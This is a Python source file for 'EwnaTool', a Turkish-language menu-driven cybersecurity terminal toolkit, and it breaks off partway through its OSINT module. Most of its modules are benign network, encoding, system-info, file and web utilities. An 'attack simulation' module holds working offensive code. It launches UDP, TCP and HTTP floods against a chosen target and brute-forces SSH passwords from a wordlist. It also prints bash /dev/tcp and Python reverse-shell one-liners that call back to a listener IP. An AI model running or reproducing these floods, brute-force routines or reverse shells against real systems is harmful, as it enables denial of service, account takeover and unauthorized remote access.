# ewnatool.py
# EwnaTool - Multi-Purpose Cybersecurity Terminal Toolkit
# Rust Core + Python Interface
# Created By 'Ewnaskia

import os
import sys
import time
import subprocess
import platform
import shutil
import json
import base64
import hashlib
import socket
import re
import random
import string
import threading
import urllib.request
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
# RENKLER
# ═══════════════════════════════════════════════════════════════
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

# ═══════════════════════════════════════════════════════════════
# BANNER (düzeltilmiş)
# ═══════════════════════════════════════════════════════════════
BANNER = r"""
╔═════════════════════════════════════════════════════════════════════════════╗
║                                                                             ║
║  ███████╗██╗    ██╗███╗   ██╗ █████╗   ████████╗ ██████╗  ██████╗ ██╗       ║
║  ██╔════╝██║    ██║████╗  ██║██╔══██╗  ╚══██╔══╝██╔═══██╗██╔═══██╗██║       ║
║  █████╗  ██║ █╗ ██║██╔██╗ ██║███████║     ██║   ██║   ██║██║   ██║██║       ║
║  ██╔══╝  ██║███╗██║██║╚██╗██║██╔══██║     ██║   ██║   ██║██║   ██║██║       ║
║  ███████╗╚███╔███╔╝██║ ╚████║██║  ██║     ██║   ╚██████╔╝╚██████╔╝███████╗  ║
║  ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝  ╚═╝     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝  ║
║                                                                             ║
║                             Created By 'Ewnaskia                            ║
║                              v2.0.0 (Rust Core)                             ║
║                                                                             ║
╚═════════════════════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════
# YARDIMCILAR
# ═══════════════════════════════════════════════════════════════
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def line(char="─", length=71, color=C.CYAN):
    print(f"{color}{char * length}{C.RESET}")

def title(text, color=C.CYAN):
    line("═", 71, color)
    print(f"{color}{C.BOLD}  {text}{C.RESET}")
    line("═", 71, color)

def info(t):    print(f"{C.BLUE}[i]{C.RESET} {t}")
def success(t): print(f"{C.GREEN}[+]{C.RESET} {t}")
def error(t):   print(f"{C.RED}[-]{C.RESET} {t}")
def warn(t):    print(f"{C.YELLOW}[!]{C.RESET} {t}")

def prompt(t="Seçim"):
    return input(f"{C.MAGENTA}{t} > {C.RESET}").strip()

def pause():
    input(f"\n{C.DIM}Devam etmek için Enter...{C.RESET}")

def loading(text, duration=1.2):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r{C.CYAN}{frames[i % len(frames)]}{C.RESET} {text}", end="", flush=True)
        time.sleep(0.07); i += 1
    print(f"\r{C.GREEN}✓{C.RESET} {text}")

def has_rust(binary):
    # Rust binary var mı kontrol et
    path = os.path.join("bin", binary)
    if os.name == "nt":
        path += ".exe"
    return os.path.isfile(path)

def rust_path(binary):
    path = os.path.join("bin", binary)
    if os.name == "nt":
        path += ".exe"
    return os.path.abspath(path)

# ═══════════════════════════════════════════════════════════════
# MODÜL 1: AĞ ARAÇLARI
# ═══════════════════════════════════════════════════════════════
def modul_ag():
    while True:
        clear(); title("MODÜL 1: AĞ ARAÇLARI", C.BLUE)
        print(f"""
  {C.CYAN}[1]{C.RESET} Yerel IP Adresi
  {C.CYAN}[2]{C.RESET} Public IP Adresi
  {C.CYAN}[3]{C.RESET} Yüksek Hızlı Port Tarama (Rust)
  {C.CYAN}[4]{C.RESET} Ping Sweep (Rust)
  {C.CYAN}[5]{C.RESET} DNS Sorgulama (Rust)
  {C.CYAN}[6]{C.RESET} Traceroute
  {C.CYAN}[7]{C.RESET} Banner Grab (Rust)
  {C.CYAN}[8]{C.RESET} MAC Adresi
  {C.CYAN}[9]{C.RESET} Açık Portları Listele
  {C.CYAN}[10]{C.RESET} Whois Sorgulama
  {C.CYAN}[11]{C.RESET} Reverse DNS
  {C.CYAN}[12]{C.RESET} HTTP Başlık Analizi
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        
        if s == "0": return
        elif s == "1":
            clear(); title("YEREL IP", C.BLUE)
            h = socket.gethostname()
            success(f"Hostname : {h}")
            success(f"Yerel IP : {socket.gethostbyname(h)}")
            pause()
        elif s == "2":
            clear(); title("PUBLIC IP", C.BLUE)
            loading("Sorgulanıyor...")
            try:
                ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
                success(f"Public IP: {ip}")
            except Exception as e: error(str(e))
            pause()
        elif s == "3":
            clear(); title("PORT TARAMA (Rust)", C.BLUE)
            if not has_rust("scanner"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            target = prompt("Hedef IP")
            pr = prompt("Port aralığı (örn 1-65535) veya tek port")
            if "-" in pr:
                a, b = pr.split("-")
            else:
                a = b = pr
            th = prompt("Thread (varsayılan 500)") or "500"
            loading("Rust scanner başlatılıyor...", 0.8)
            subprocess.run([rust_path("scanner"), target, a, b, th])
            pause()
        elif s == "4":
            clear(); title("PING SWEEP (Rust)", C.BLUE)
            if not has_rust("netprobe"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            prefix = prompt("Ağ öneki (örn 192.168.1)")
            subprocess.run([rust_path("netprobe"), "sweep", prefix])
            pause()
        elif s == "5":
            clear(); title("DNS SORGULAMA (Rust)", C.BLUE)
            if not has_rust("dnsx"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            dom = prompt("Domain(ler) (virgülle ayır)")
            domains = [d.strip() for d in dom.split(",")]
            subprocess.run([rust_path("dnsx")] + domains)
            pause()
        elif s == "6":
            clear(); title("TRACEROUTE", C.BLUE)
            t = prompt("Hedef")
            cmd = ["tracert", t] if os.name == "nt" else ["traceroute", t]
            try: subprocess.run(cmd)
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("BANNER GRAB (Rust)", C.BLUE)
            if not has_rust("netprobe"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            ip = prompt("Hedef IP"); pt = prompt("Port")
            subprocess.run([rust_path("netprobe"), "banner", ip, pt])
            pause()
        elif s == "8":
            clear(); title("MAC ADRESİ", C.BLUE)
            try:
                if os.name == "nt": subprocess.run(["getmac"])
                else: subprocess.run(["ip", "link"])
            except Exception as e: error(str(e))
            pause()
        elif s == "9":
            clear(); title("AÇIK PORTLAR", C.BLUE)
            try:
                if os.name == "nt": subprocess.run(["netstat", "-an"])
                else: subprocess.run(["ss", "-tulnp"])
            except Exception as e: error(str(e))
            pause()
        elif s == "10":
            clear(); title("WHOIS", C.BLUE)
            d = prompt("Domain")
            try: subprocess.run(["whois", d])
            except Exception as e: error(str(e))
            pause()
        elif s == "11":
            clear(); title("REVERSE DNS", C.BLUE)
            ip = prompt("IP")
            try:
                host = socket.gethostbyaddr(ip)
                success(f"Hostname: {host[0]}")
                for a in host[1]: print(f"  Alias: {a}")
            except Exception as e: error(str(e))
            pause()
        elif s == "12":
            clear(); title("HTTP BAŞLIKLARI", C.BLUE)
            url = prompt("URL")
            loading("İstek gönderiliyor...")
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "EwnaTool/2.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                for k, v in resp.headers.items():
                    print(f"  {C.CYAN}{k}{C.RESET}: {v}")
            except Exception as e: error(str(e))
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 2: KRİPTOGRAFİ
# ═══════════════════════════════════════════════════════════════
def modul_kripto():
    while True:
        clear(); title("MODÜL 2: KRİPTOGRAFİ", C.MAGENTA)
        print(f"""
  {C.CYAN}[1]{C.RESET} Hash Hesapla (Rust)
  {C.CYAN}[2]{C.RESET} Base64 Kodla
  {C.CYAN}[3]{C.RESET} Base64 Çöz
  {C.CYAN}[4]{C.RESET} Şifre Üret
  {C.CYAN}[5]{C.RESET} XOR Şifrele
  {C.CYAN}[6]{C.RESET} XOR Çöz
  {C.CYAN}[7]{C.RESET} UUID Üret
  {C.CYAN}[8]{C.RESET} ROT13
  {C.CYAN}[9]{C.RESET} Hex Kodla/Çöz
  {C.CYAN}[10]{C.RESET} URL Kodla/Çöz
  {C.CYAN}[11]{C.RESET} Binary Kodla/Çöz
  {C.CYAN}[12]{C.RESET} Hash Karşılaştır
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        
        if s == "0": return
        elif s == "1":
            clear(); title("HASH (Rust)", C.MAGENTA)
            if not has_rust("hasher"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            mode = prompt("Mod (text/file)") or "text"
            val = prompt("Değer")
            subprocess.run([rust_path("hasher"), mode, val])
            pause()
        elif s == "2":
            clear(); title("BASE64 KODLA", C.MAGENTA)
            t = prompt("Metin")
            success(base64.b64encode(t.encode()).decode())
            pause()
        elif s == "3":
            clear(); title("BASE64 ÇÖZ", C.MAGENTA)
            t = prompt("Base64")
            try: success(base64.b64decode(t.encode()).decode())
            except Exception as e: error(str(e))
            pause()
        elif s == "4":
            clear(); title("ŞİFRE ÜRET", C.MAGENTA)
            try: L = int(prompt("Uzunluk (16)") or "16")
            except: L = 16
            chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
            success("".join(random.choice(chars) for _ in range(L)))
            pause()
        elif s == "5":
            clear(); title("XOR ŞİFRELE", C.MAGENTA)
            t = prompt("Metin"); k = prompt("Anahtar")
            r = "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(t))
            success(base64.b64encode(r.encode()).decode())
            pause()
        elif s == "6":
            clear(); title("XOR ÇÖZ", C.MAGENTA)
            t = prompt("Şifreli (base64)"); k = prompt("Anahtar")
            try:
                d = base64.b64decode(t.encode()).decode()
                r = "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(d))
                success(r)
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("UUID ÜRET", C.MAGENTA)
            import uuid
            for _ in range(5): success(str(uuid.uuid4()))
            pause()
        elif s == "8":
            clear(); title("ROT13", C.MAGENTA)
            t = prompt("Metin")
            import codecs
            success(codecs.encode(t, "rot_13"))
            pause()
        elif s == "9":
            clear(); title("HEX", C.MAGENTA)
            mode = prompt("Kodla(1) / Çöz(2)")
            t = prompt("Değer")
            if mode == "1": success(t.encode().hex())
            else:
                try: success(bytes.fromhex(t).decode())
                except Exception as e: error(str(e))
            pause()
        elif s == "10":
            clear(); title("URL ENCODE", C.MAGENTA)
            mode = prompt("Kodla(1) / Çöz(2)")
            t = prompt("Değer")
            import urllib.parse
            if mode == "1": success(urllib.parse.quote(t))
            else: success(urllib.parse.unquote(t))
            pause()
        elif s == "11":
            clear(); title("BINARY", C.MAGENTA)
            mode = prompt("Kodla(1) / Çöz(2)")
            t = prompt("Değer")
            if mode == "1":
                success(" ".join(format(ord(c), "08b") for c in t))
            else:
                try:
                    bits = t.replace(" ", "")
                    chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)]
                    success("".join(chars))
                except Exception as e: error(str(e))
            pause()
        elif s == "12":
            clear(); title("HASH KARŞILAŞTIR", C.MAGENTA)
            a = prompt("Hash 1").lower(); b = prompt("Hash 2").lower()
            if a == b: success("EŞLEŞİYOR")
            else: error("EŞLEŞMİYOR")
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 3: SİSTEM BİLGİSİ
# ═══════════════════════════════════════════════════════════════
def modul_sistem():
    while True:
        clear(); title("MODÜL 3: SİSTEM BİLGİSİ", C.GREEN)
        print(f"""
  {C.CYAN}[1]{C.RESET} Genel Sistem Bilgisi
  {C.CYAN}[2]{C.RESET} CPU Detayları
  {C.CYAN}[3]{C.RESET} Bellek Kullanımı
  {C.CYAN}[4]{C.RESET} Disk Kullanımı
  {C.CYAN}[5]{C.RESET} Ağ Arayüzleri
  {C.CYAN}[6]{C.RESET} Çalışan Süreçler
  {C.CYAN}[7]{C.RESET} Ortam Değişkenleri
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s == "1":
            clear(); title("SİSTEM BİLGİSİ", C.GREEN)
            loading("Toplanıyor...")
            d = {
                "İşletim Sistemi": platform.system(),
                "Sürüm": platform.release(),
                "Versiyon": platform.version(),
                "Mimari": platform.machine(),
                "İşlemci": platform.processor(),
                "Hostname": socket.gethostname(),
                "Python": platform.python_version(),
                "Kullanıcı": os.getenv("USER") or os.getenv("USERNAME"),
                "Ana Dizin": os.path.expanduser("~"),
                "Çalışma Dizini": os.getcwd(),
            }
            for k, v in d.items():
                print(f"  {C.CYAN}{k:<20}{C.RESET}: {v}")
            pause()
        elif s == "2":
            clear(); title("CPU", C.GREEN)
            if os.name == "nt": subprocess.run(["wmic", "cpu", "get", "name,numberofcores,maxclockspeed"])
            else: subprocess.run(["lscpu"])
            pause()
        elif s == "3":
            clear(); title("BELLEK", C.GREEN)
            if os.name == "nt": subprocess.run(["wmic", "OS", "get", "FreePhysicalMemory,TotalVisibleMemorySize"])
            else: subprocess.run(["free", "-h"])
            pause()
        elif s == "4":
            clear(); title("DİSK", C.GREEN)
            if os.name == "nt": subprocess.run(["wmic", "logicaldisk", "get", "size,freespace,caption"])
            else: subprocess.run(["df", "-h"])
            pause()
        elif s == "5":
            clear(); title("AĞ ARAYÜZLERİ", C.GREEN)
            try:
                if os.name == "nt": subprocess.run(["ipconfig", "/all"])
                else: subprocess.run(["ip", "addr"])
            except Exception as e: error(str(e))
            pause()
        elif s == "6":
            clear(); title("SÜREÇLER", C.GREEN)
            try:
                if os.name == "nt": subprocess.run(["tasklist"])
                else: subprocess.run(["ps", "aux"])
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("ORTAM", C.GREEN)
            for k, v in sorted(os.environ.items())[:40]:
                print(f"  {C.CYAN}{k}{C.RESET} = {v}")
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 4: DOSYA ARAÇLARI
# ═══════════════════════════════════════════════════════════════
def modul_dosya():
    while True:
        clear(); title("MODÜL 4: DOSYA ARAÇLARI", C.YELLOW)
        print(f"""
  {C.CYAN}[1]{C.RESET} Dosya Hash (Rust)
  {C.CYAN}[2]{C.RESET} Dosya Şifrele (XOR)
  {C.CYAN}[3]{C.RESET} Dosya Parçala
  {C.CYAN}[4]{C.RESET} Dosya Birleştir
  {C.CYAN}[5]{C.RESET} Dosya Ara
  {C.CYAN}[6]{C.RESET} Dosya Bilgisi
  {C.CYAN}[7]{C.RESET} Dosya Karşılaştır
  {C.CYAN}[8]{C.RESET} Base64 Dosya Kodla
  {C.CYAN}[9]{C.RESET} Base64 Dosya Çöz
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s == "1":
            clear(); title("DOSYA HASH (Rust)", C.YELLOW)
            if not has_rust("hasher"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            p = prompt("Dosya yolu")
            subprocess.run([rust_path("hasher"), "file", p])
            pause()
        elif s == "2":
            clear(); title("DOSYA ŞİFRELE", C.YELLOW)
            p = prompt("Dosya"); k = prompt("Anahtar")
            try:
                data = open(p, "rb").read()
                kb = k.encode()
                enc = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
                open(p + ".enc", "wb").write(enc)
                success(f"{p}.enc")
            except Exception as e: error(str(e))
            pause()
        elif s == "3":
            clear(); title("PARÇALA", C.YELLOW)
            p = prompt("Dosya"); size = int(prompt("Parça MB (10)") or "10")
            data = open(p, "rb").read()
            cs = size * 1024 * 1024
            for i in range(0, len(data), cs):
                open(f"{p}.part{i//cs}", "wb").write(data[i:i+cs])
            success(f"{(len(data)//cs)+1} parça oluşturuldu")
            pause()
        elif s == "4":
            clear(); title("BİRLEŞTİR", C.YELLOW)
            base = prompt("Kök (örn: file.txt)"); out = prompt("Çıktı")
            i = 0
            with open(out, "wb") as o:
                while True:
                    pt = f"{base}.part{i}"
                    if not os.path.exists(pt): break
                    o.write(open(pt, "rb").read()); i += 1
            success(f"{i} parça birleştirildi")
            pause()
        elif s == "5":
            clear(); title("DOSYA ARA", C.YELLOW)
            p = prompt("Dizin"); pat = prompt("Desen (örn: *.txt)")
            import fnmatch
            for root, _, files in os.walk(p):
                for n in fnmatch.filter(files, pat):
                    print(f"  {os.path.join(root, n)}")
            pause()
        elif s == "6":
            clear(); title("DOSYA BİLGİSİ", C.YELLOW)
            p = prompt("Dosya")
            try:
                st = os.stat(p)
                print(f"  Boyut      : {st.st_size} byte")
                print(f"  Oluşturma  : {datetime.fromtimestamp(st.st_ctime)}")
                print(f"  Değişim    : {datetime.fromtimestamp(st.st_mtime)}")
                print(f"  Erişim     : {datetime.fromtimestamp(st.st_atime)}")
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("DOSYA KARŞILAŞTIR", C.YELLOW)
            a = prompt("Dosya 1"); b = prompt("Dosya 2")
            ha = hashlib.sha256(open(a, "rb").read()).hexdigest()
            hb = hashlib.sha256(open(b, "rb").read()).hexdigest()
            if ha == hb: success("AYNI")
            else: error(f"FARKLI\n  {a}: {ha}\n  {b}: {hb}")
            pause()
        elif s == "8":
            clear(); title("BASE64 DOSYA KODLA", C.YELLOW)
            p = prompt("Dosya")
            data = open(p, "rb").read()
            enc = base64.b64encode(data).decode()
            open(p + ".b64", "w").write(enc)
            success(f"{p}.b64 ({len(enc)} karakter)")
            pause()
        elif s == "9":
            clear(); title("BASE64 DOSYA ÇÖZ", C.YELLOW)
            p = prompt("Base64 dosya")
            data = base64.b64decode(open(p).read())
            out = p.replace(".b64", "")
            open(out, "wb").write(data)
            success(f"{out} ({len(data)} byte)")
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 5: WEB ARAÇLARI
# ═══════════════════════════════════════════════════════════════
def modul_web():
    while True:
        clear(); title("MODÜL 5: WEB ARAÇLARI", C.RED)
        print(f"""
  {C.CYAN}[1]{C.RESET} HTTP Başlık Analizi
  {C.CYAN}[2]{C.RESET} HTTP Durum Kodu
  {C.CYAN}[3]{C.RESET} robots.txt
  {C.CYAN}[4]{C.RESET} sitemap.xml
  {C.CYAN}[5]{C.RESET} SSL Sertifika
  {C.CYAN}[6]{C.RESET} URL Kısalt
  {C.CYAN}[7]{C.RESET} HTTP Yöntemleri Test
  {C.CYAN}[8]{C.RESET} Güvenlik Başlıkları Kontrol
  {C.CYAN}[9]{C.RESET} Cookie Analizi
  {C.CYAN}[10]{C.RESET} Yönlendirme Zinciri
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s == "1":
            clear(); title("HTTP BAŞLIKLARI", C.RED)
            u = prompt("URL"); loading("İstek...")
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "EwnaTool/2.0"})
                r = urllib.request.urlopen(req, timeout=10)
                for k, v in r.headers.items(): print(f"  {C.CYAN}{k}{C.RESET}: {v}")
            except Exception as e: error(str(e))
            pause()
        elif s == "2":
            clear(); title("HTTP DURUM", C.RED)
            u = prompt("URL")
            try:
                req = urllib.request.Request(u, method="HEAD")
                r = urllib.request.urlopen(req, timeout=10)
                success(f"{r.status} {r.reason}")
            except Exception as e: error(str(e))
            pause()
        elif s == "3":
            clear(); title("robots.txt", C.RED)
            u = prompt("Site")
            try:
                r = urllib.request.urlopen(u.rstrip("/") + "/robots.txt", timeout=10)
                print(r.read().decode(errors="ignore"))
            except Exception as e: error(str(e))
            pause()
        elif s == "4":
            clear(); title("sitemap.xml", C.RED)
            u = prompt("Site")
            try:
                r = urllib.request.urlopen(u.rstrip("/") + "/sitemap.xml", timeout=10)
                print(r.read().decode(errors="ignore")[:3000])
            except Exception as e: error(str(e))
            pause()
        elif s == "5":
            clear(); title("SSL SERTİFİKA", C.RED)
            h = prompt("Host")
            try:
                import ssl
                ctx = ssl.create_default_context()
                with ctx.wrap_socket(socket.socket(), server_hostname=h) as ss:
                    ss.settimeout(5); ss.connect((h, 443))
                    for k, v in ss.getpeercert().items():
                        print(f"  {C.CYAN}{k}{C.RESET}: {v}")
            except Exception as e: error(str(e))
            pause()
        elif s == "6":
            clear(); title("URL KISALT", C.RED)
            u = prompt("URL")
            try:
                short = urllib.request.urlopen(f"https://tinyurl.com/api-create.php?url={u}", timeout=10).read().decode()
                success(short)
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("HTTP YÖNTEMLERİ", C.RED)
            u = prompt("URL")
            for m in ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]:
                try:
                    req = urllib.request.Request(u, method=m)
                    r = urllib.request.urlopen(req, timeout=5)
                    print(f"  {C.GREEN}{m:<8}{C.RESET} {r.status}")
                except urllib.error.HTTPError as e:
                    print(f"  {C.YELLOW}{m:<8}{C.RESET} {e.code}")
                except Exception:
                    print(f"  {C.RED}{m:<8}{C.RESET} HATA")
            pause()
        elif s == "8":
            clear(); title("GÜVENLİK BAŞLIKLARI", C.RED)
            u = prompt("URL")
            checks = ["Strict-Transport-Security", "Content-Security-Policy",
                      "X-Frame-Options", "X-Content-Type-Options",
                      "Referrer-Policy", "Permissions-Policy"]
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "EwnaTool"})
                r = urllib.request.urlopen(req, timeout=10)
                for c in checks:
                    if c in r.headers: success(f"{c}: {r.headers[c]}")
                    else: warn(f"{c}: YOK")
            except Exception as e: error(str(e))
            pause()
        elif s == "9":
            clear(); title("COOKIE ANALİZİ", C.RED)
            u = prompt("URL")
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "EwnaTool"})
                r = urllib.request.urlopen(req, timeout=10)
                cookies = r.headers.get_all("Set-Cookie") or []
                if not cookies: warn("Cookie yok")
                for c in cookies: print(f"  {C.CYAN}{c}{C.RESET}")
            except Exception as e: error(str(e))
            pause()
        elif s == "10":
            clear(); title("YÖNLENDİRME ZİNCİRİ", C.RED)
            u = prompt("URL")
            try:
                import urllib.request
                class NoRedirect(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, *a, **k): return None
                op = urllib.request.build_opener(NoRedirect)
                cur = u
                for i in range(10):
                    try:
                        r = op.open(cur, timeout=5)
                        success(f"{i+1}. {cur} -> {r.status}"); break
                    except urllib.error.HTTPError as e:
                        loc = e.headers.get("Location", "")
                        print(f"  {C.CYAN}{i+1}. {cur}{C.RESET} -> {e.code} -> {loc}")
                        if not loc: break
                        cur = loc if loc.startswith("http") else urllib.parse.urljoin(cur, loc)
            except Exception as e: error(str(e))
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 6: SALDIRI SİMÜLASYONU (Rust Core)
# ═══════════════════════════════════════════════════════════════
def modul_saldiri():
    while True:
        clear(); title("MODÜL 6: SALDIRI SİMÜLASYONU (Rust)", C.RED)
        print(f"""
  {C.CYAN}[1]{C.RESET} UDP Flood (Rust - yüksek hız)
  {C.CYAN}[2]{C.RESET} TCP Flood (Rust)
  {C.CYAN}[3]{C.RESET} HTTP Flood (Rust)
  {C.CYAN}[4]{C.RESET} Port Knocking
  {C.CYAN}[5]{C.RESET} SSH Brute Force
  {C.CYAN}[6]{C.RESET} Reverse Shell (test)
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s in ("1", "2", "3"):
            clear(); title(f"{'UDP' if s=='1' else 'TCP' if s=='2' else 'HTTP'} FLOOD (Rust)", C.RED)
            if not has_rust("flooder"):
                error("Rust binary yok. Önce: ./build.sh"); pause(); continue
            m = {"1": "udp", "2": "tcp", "3": "http"}[s]
            ip = prompt("Hedef IP"); pt = prompt("Port")
            th = prompt("Thread (500)") or "500"
            du = prompt("Süre sn (60)") or "60"
            warn("Yalnızca yetkili sistemlerde test edin!")
            subprocess.run([rust_path("flooder"), m, ip, pt, th, du])
            pause()
        elif s == "4":
            clear(); title("PORT KNOCKING", C.RED)
            ip = prompt("Hedef IP"); ports = prompt("Portlar (virgülle)").split(",")
            for p in ports:
                try:
                    sock = socket.socket(); sock.settimeout(0.5)
                    sock.connect_ex((ip, int(p.strip()))); sock.close()
                    success(f"Port {p.strip()} vuruldu"); time.sleep(0.1)
                except: pass
            pause()
        elif s == "5":
            clear(); title("SSH BRUTE", C.RED)
            ip = prompt("IP"); u = prompt("Kullanıcı"); wl = prompt("Wordlist")
            try:
                import paramiko
                pwds = [l.strip() for l in open(wl) if l.strip()]
                for p in pwds:
                    try:
                        cl = paramiko.SSHClient(); cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        cl.connect(ip, username=u, password=p, timeout=2)
                        success(f"BULUNDU: {u}:{p}"); cl.close(); break
                    except: print(f"\r{C.DIM}{p}{C.RESET}", end="")
            except ImportError: error("pip install paramiko")
            except Exception as e: error(str(e))
            pause()
        elif s == "6":
            clear(); title("REVERSE SHELL (test)", C.RED)
            ip = prompt("Dinleyici IP"); pt = prompt("Port")
            info(f"nc -lvnp {pt} ile dinle")
            print(f"\n  {C.YELLOW}Bash:{C.RESET}")
            print(f"  bash -i >& /dev/tcp/{ip}/{pt} 0>&1")
            print(f"\n  {C.YELLOW}Python:{C.RESET}")
            print(f"  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{pt}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'")
            pause()

# ═══════════════════════════════════════════════════════════════
# MODÜL 7: OSINT
# ═══════════════════════════════════════════════════════════════
def modul_osint():
    while True:
        clear(); title("MODÜL 7: OSINT", C.MAGENTA)
        print(f"""
  {C.CYAN}[1]{C.RESET} IP Konum Sorgula
  {C.CYAN}[2]{C.RESET} Domain WHOIS
  {C.CYAN}[3]{C.RESET} Email Doğrula
  {C.CYAN}[4]{C.RESET} Telefon Formatla
  {C.CYAN}[5]{C.RESET} Kullanıcı Adı Ara
  {C.CYAN}[6]{C.RESET} Email Sızıntı Kontrol (HIBP)
  {C.CYAN}[7]{C.RESET} Domain Bilgisi Topla
  {C.CYAN}[8]{C.RESET} Subdomain Keşfi
  {C.CYAN}[9]{C.RESET} IP Reputation
  {C.CYAN}[0]{C.RESET} Ana Menü
""")
        s = prompt()
        if s == "0": return
        elif s == "1":
            clear(); title("IP KONUM", C.MAGENTA)
            ip = prompt("IP")
            try:
                d = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}?lang=tr", timeout=10).read())
                for k, v in d.items(): print(f"  {C.CYAN}{k}{C.RESET}: {v}")
            except Exception as e: error(str(e))
            pause()
        elif s == "2":
            clear(); title("WHOIS", C.MAGENTA)
            d = prompt("Domain")
            try: subprocess.run(["whois", d])
            except Exception as e: error(str(e))
            pause()
        elif s == "3":
            clear(); title("EMAIL DOĞRULA", C.MAGENTA)
            e = prompt("Email")
            if re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", e):
                success(f"Geçerli: {e}")
            else: error(f"Geçersiz: {e}")
            pause()
        elif s == "4":
            clear(); title("TELEFON FORMATLA", C.MAGENTA)
            t = prompt("Telefon")
            d = re.sub(r"\D", "", t)
            if len(d) == 10: print(f"  TR: +90 {d[:3]} {d[3:6]} {d[6:]}")
            elif len(d) == 11 and d.startswith("0"): print(f"  TR: +90 {d[1:4]} {d[4:7]} {d[7:]}")
            else: warn(d)
            pause()
        elif s == "5":
            clear(); title("KULLANICI ADI ARA", C.MAGENTA)
            u = prompt("Kullanıcı adı")
            sites = {
                "GitHub": f"https://github.com/{u}",
                "Twitter": f"https://twitter.com/{u}",
                "Instagram": f"https://instagram.com/{u}",
                "Reddit": f"https://reddit.com/user/{u}",
                "YouTube": f"https://youtube.com/@{u}",
                "TikTok": f"https://tiktok.com/@{u}",
                "Telegram": f"https://t.me/{u}",
                "Medium": f"https://medium.com/@{u}",
                "Pinterest": f"https://pinterest.com/{u}",
                "Twitch": f"https://twitch.tv/{u}",
            }
            for site, url in sites.items():
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    r = urllib.request.urlopen(req, timeout=5)
                    if r.status == 200: success(f"{site}: {url}")
                    else: print(f"  {C.DIM}{site}: yok{C.RESET}")
                except: print(f"  {C.DIM}{site}: yok{C.RESET}")
            pause()
        elif s == "6":
            clear(); title("HIBP EMAIL", C.MAGENTA)
            e = prompt("Email")
            try:
                req = urllib.request.Request(f"https://haveibeenpwned.com/api/v3/breachedaccount/{e}",
                                             headers={"User-Agent": "EwnaTool"})
                d = json.loads(urllib.request.urlopen(req, timeout=10).read())
                for b in d: success(f"{b['Name']} ({b['BreachDate']})")
            except urllib.error.HTTPError as ex:
                if ex.code == 404: success("Sızıntı bulunamadı")
                else: error(f"HTTP {ex.code}")
            except Exception as e: error(str(e))
            pause()
        elif s == "7":
            clear(); title("DOMAIN BİLGİSİ", C.MAGENTA)
            d = prompt("Domain")
            try:
                ip = socket.gethostbyname(d)
                success(f"IP: {ip}")
                subprocess.run(["whois", d])
            except Exception as e: error(str(e))
            pause()
        elif s == "8":
            clear(); title("SUBDOMAIN KEŞFİ", C.MAGENTA)
            d = prompt("Domain (örn: example.com)")
            subs = ["www", "mail", "ftp", "admin", "blog", "api", "dev", "test", "staging", "portal",
                    "vpn", "remote", "webmail", "smtp", "pop", "imap", "ns1", "ns2", "cdn", "static"]
            for sb in subs:
                host = f"{sb}.{d}"
                try:
                    ip = socket.gethostbyname(host)
                    success(f"{host} -> {ip}")
                except: pass
            pause()
        elif s == "9":
            clear(); title("IP REPUTATION", C.MAGENTA)
            ip = prompt("IP")
            try:
